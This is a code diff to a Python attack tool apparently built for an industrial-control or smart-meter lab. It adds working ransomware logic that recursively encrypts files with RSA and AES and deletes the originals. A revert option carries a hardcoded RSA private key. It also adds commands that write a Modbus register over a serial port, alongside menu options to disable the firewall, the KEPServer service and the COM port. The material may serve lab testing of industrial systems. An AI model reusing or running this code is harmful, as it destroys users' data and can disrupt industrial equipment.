@@ -81,7 +81,7 @@ def disable_kepserver():
 
 #Run modpoll to interrupt COM1 port
 def run_modinterrup():
-    current_directory = os.getcwd()
+    current_directory = getcwd()
     executable_path = current_directory + "\\modpoll.exe"
     parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "2", "COM1"]
     try:
@@ -138,8 +138,114 @@ def Create_Share_folder():
         NetShareAdd(None, 2, share_info)
         print ("SmartMeterfolder has been shared.")
 
+def encrypt_Files():
+    #public key
+    pubKey = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxZUs0TkppUGlaQ1o0aDRwM2lzNwpyOTdTRGRnaWtrckswNE1sc3oraHY2UmIxKzB2M1hsY296QXVGeGIvMjkxTE5tNGs1M1RZTXQ4M3BPRm9ZRTh4Ckx0VE55UVNSMDR2dzBGcGRwU3Y1YVVjbysxRmtwRjRMdCtqV1Q0YjVrTUFqWTRkOW5Yb3lRQmxJbzBWckMwQzIKcldpeklONGV1TXBTbll3V2Z0a2JsZE5qcDJ1U0hFeWM1Z0FZR1ZKSWZ6TVRiaUxZd0k5aU9rNllnWEozbWJLdAp1dHo2WlRTdlplVzEwaUhrc2JXUXgvcUVjR0JLWFJUbkUvYTJkZVhvRThRaFZOTUV5Z0xVQmF3NERYaWRCbXBiCnFmSWtvZk5UWlQ3K2NyaENocVptYmFrSjA5bTdmT3k1TURud0oraU0wdlBheW1tdGduWnBrR0NQNlpDVDlkeHoKcHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''
+    pubKey = base64.b64decode(pubKey)
+
+    #directory to encrypt
+    directory = 'C://Users//Student//Documents//ransomwareTest'
+    #exclude extensions
+    excludeExtension = ['.py','.pem', '.exe']
+
+    for item in recurseFiles(directory): 
+        filePath = Path(item)
+        fileType = filePath.suffix.lower()
+
+        if fileType in excludeExtension:
+            continue
+        encrypt(filePath, pubKey)
+        print("Encrypted: " + str(filePath))
+
+def encrypt(dataFile, publicKey):
+    '''
+    Input: path to file to encrypt, public key
+    Output: encrypted file with extension .L0v3sh3 and remove original file
+    use EAX mode to allow detection of unauthorized modifications
+    '''
+    # read data from file
+    extension = dataFile.suffix.lower()
+    dataFile = str(dataFile)
+    with open(dataFile, 'rb') as f:
+        data = f.read()
+    
+    # convert data to bytes
+    data = bytes(data)
+
+    # create public key object
+    key = RSA.import_key(publicKey)
+    sessionKey = urandom(16)
+
+    # encrypt the session key with the public key
+    cipher = PKCS1_OAEP.new(key)
+    encryptedSessionKey = cipher.encrypt(sessionKey)
+
+    # encrypt the data with the session key
+    cipher = AES.new(sessionKey, AES.MODE_EAX)
+    ciphertext, tag = cipher.encrypt_and_digest(data)
+
+    # save the encrypted data to file
+    fileName= dataFile.split(extension)[0]
+    fileExtension = '.encrypted'
+    encryptedFile = fileName + fileExtension
+    with open(encryptedFile, 'wb') as f:
+        [ f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext) ]
+    remove(dataFile)
+
+def recurseFiles(baseDirectory):
+    #Scan a directory and return a list of all files
+    for entry in scandir(baseDirectory):
+        if entry.is_file():
+            yield entry
+        else:
+            yield from recurseFiles(entry.path)
+
+def decrypt(dataFile, privatekey):
+    '''
+    use EAX mode to allow detection of unauthorized modifications
+    '''
+    with open("private.pem", 'w+') as f:
+        f.write(privatekey)
+
+    # read private key from file
+    with open("private.pem", 'rb') as f:
+        privateKey = f.read()
+        # create private key object
+        key = RSA.import_key(privateKey)
+
+    # read data from file
+    with open(dataFile, 'rb') as f:
+        # read the session key
+        encryptedSessionKey, nonce, tag, ciphertext = [ f.read(x) for x in (key.size_in_bytes(), 16, 16, -1) ]
+
+    # decrypt the session key
+    cipher = PKCS1_OAEP.new(key)
+    sessionKey = cipher.decrypt(encryptedSessionKey)
+
+    # decrypt the data with the session key
+    cipher = AES.new(sessionKey, AES.MODE_EAX, nonce)
+    data = cipher.decrypt_and_verify(ciphertext, tag)
+
+    # save the decrypted data to file
+    [ fileName, fileExtension ] = str(dataFile).split('.')
+    decryptedFile = fileName + '_decrypted.csv'
+    with open(decryptedFile, 'wb') as f:
+        f.write(data)
+
+    print('Decrypted file saved to ' + decryptedFile)
+
+#Run modpoll to change register 40201 to 26
+def test():
+    current_directory = getcwd()
+    executable_path = current_directory + "\\modpoll.exe"
+    parameters = ["-r", "40201", "COM1", "26"]
+    try:
+        check_call([executable_path] + parameters)
+    except CalledProcessError as e:
+        print("Error executing the executable file:", e)
+
 def revert(revertoption):
-    # 1 To enable firewall, 2 to remove firewall rule, 3 to re-enable KEPService, 4 to re-enable comport
+    # 1 To enable firewall, 2 to remove firewall rule, 3 to re-enable KEPService, 4 to re-enable comport, 5 to decrypt files, 6 to change register 40201 back to 25
     if revertoption == "1":
         cp = run('netsh advfirewall set allprofiles state on',stdout=PIPE , shell=True)
         if cp.stdout.decode('utf-8').strip() == "Ok.":
@@ -196,6 +302,56 @@ def revert(revertoption):
         print(cp.stdout.decode('utf-8'))
         remove("script.bat")
 
+    elif revertoption == "5":
+        privatekey = '''-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEA6bgvahtvppczlz5oohPU/2D81huNsz5VfSGxtE5TICh0npaG
+/AngulN/gRDEo2W/ZUiu9cmanfDQUReTS0ECs0W4AHN53fPWvtdcsX4zD9ydgurt
+EAyJxAdKzNpNH8Iber/Jo0CFfW/eNITDDk2OTe2xkKS1uG8jOGz4f45FC+q5ky/U
+cqWktAPnxArUBeApDl6LcAMc1wlfOWD3S9dpyeoMc1zvyWRQEkWQ7cs+eXovix2m
+8t5VorMc+H8LuVX+GiMWfdC4SLQEw2/UXBOELnbVUAnT2d/uh7MsknhR2KBNQODv
+sJmMGDPQZtK5svJuwtcGaak/mspJ7IOKcVNt3wIDAQABAoIBAAF5gYcUXDx7WL58
+DNH0+RORa5b4PokifAyZkVL3aYva5X14qqpdb5cNXtEUJ4F2a2I6tqvjVT/o3I+e
+a/X+F4PFDVenYt31I2Y52qJeDvlrJW1FiTBgO+BKQX0QZYstQNoh6qZGinETqx2+
+trJY5+xy8vtcJq9euCSrf1fisGnWUrVv36QEiXM52dWHVKCFsV4zOEM3eIUZ8WZb
+65MIPwAG9Qj/GRXfmlgCGnLOvcEZuBayVX4DZ8ELex7jFaNt/dxeOIKPSBps3fcn
+GAGTcxYnnUAOgquj6ixFZt9E0aU84+OwsMtis1wG5lOusEhyHz66eP9x097Vve4O
+/35VVn0CgYEA6eG2TufnlU6U5harOapmIuZrQeuZHlCqGBMTjY+tBY6eqiTocYPI
+Rj3/+CuW1c/hX2xXmRXPUaJKvnJvmKro4VML8c9j4YHRbLX+2Az0xPTvkMiun4/0
+Y6f7ECiBRGwZiTItR0e/ft7ByeRoqTks0yc2zEctHFbX94+4D7SEL0MCgYEA/9KL
+vLWpB83gQ/7+TpuqYdmURxSFZd7tXKGdoN1mHXwEdTfGeVY1cSalRnkIaf+rRN+s
+Po7OJ1JLKzg8UZ2rJxRtlX6S0CXvqa9M+qf9NvT+MdmJL9yYY3IXXVB2pCQRrRnL
+z/wzq5MOIWPCTuwOPAx6UlS9kV2R4wwL1Yp09zUCgYEAzn/Df5eyGVnwjdamB5wz
+4cygFuv1nZaLGAZ/1RVuJuHtpTxBHzjDs4E6Z9vUqaOJ0b7O+RMQoXsxk0Vm0tzU
+EV5JxY7fGVSNm/Z0tD18QAojGyqVQ7zOgs7mFTYuLENlqITtBWqL4XC8mY1Z+0/I
+DAcrkuGlKshiluoGEZfIvhECgYAt062slG4/M6YlCBzOQBx5gtyJDygGY7TpjxoJ
+ox+T0I+L3/3x5nuUVXPt9+iF9ILdx6O3YSWU7a0BhQVpKXFrgsFOsmniV6ljIEAN
+9uHpYmHW1D07Ea1KwzlkQfG+3ac89w4HqAophiJV4OUB9k9memW/Mebzj2t+3L2R
+90eUsQKBgHy/LhN/Mjuh7F0oP0pWoJJWXFW7Q9rqzC6Ev1VXMk4sYjNyBzWB144f
+mae/+O5k4uXziLwNSyUmB9GiIEgloABmQIxOez7yez5XD2kfw+PUqcelVD2z+zI2
+4OAdDMfj6v+BO6v4CKVP0rdYYuwzZ4OaoP+aR41gJiM5ut0aZca6
+-----END RSA PRIVATE KEY-----'''
+        directory = "C://Users//Student//Documents//ransomwareTest" # CHANGE THIS
+        excludeExtension = ['.py','.pem', '.exe'] # CHANGE THIS
+        for item in recurseFiles(directory): 
+            filePath = Path(item)
+            fileType = filePath.suffix.lower()
+
+            if fileType in excludeExtension:
+                continue
+            decrypt(filePath, privatekey)
+        remove("private.pem")
+
+    elif revertoption == "6":
+        current_directory = getcwd()
+        executable_path = current_directory + "\\modpoll.exe"
+        parameters = ["-r", "40201", "COM1", "25"]
+        try:
+            check_call([executable_path] + parameters)
+        except CalledProcessError as e:
+            print("Error executing the executable file:", e)
+        else:
+            print ("Invalid Option!")
+
 if __name__ == '__main__':
     check_admin()
     attackoption = str(argv[1])
@@ -215,9 +371,13 @@ if __name__ == '__main__':
     elif attackoption == "7":
         disable_COMPort()
     elif attackoption == "8":
+        encrypt_Files()
+    elif attackoption == "9":
         revertoption = str(argv[2])
         revert(revertoption)
     elif attackoption == "-h":
-        print("\nChoose 1 to delete file, 2 to copy file, 3 to disable firewall, 4 to disable ssh through firewall, 5 to disable Kepserver, 6 to interrup modbus reading, 7 to disable COMPORT, 8 to revert with options.")
+        print("\nChoose 1 to delete file, 2 to copy file, 3 to disable firewall, 4 to disable ssh through firewall, 5 to disable Kepserver, 6 to interrup modbus reading, 7 to disable COMPORT, 8 to encrypt files, 9 to revert with options.")
+    elif attackoption == "10":
+        test()
     else:
         print ("Invalid Option!")
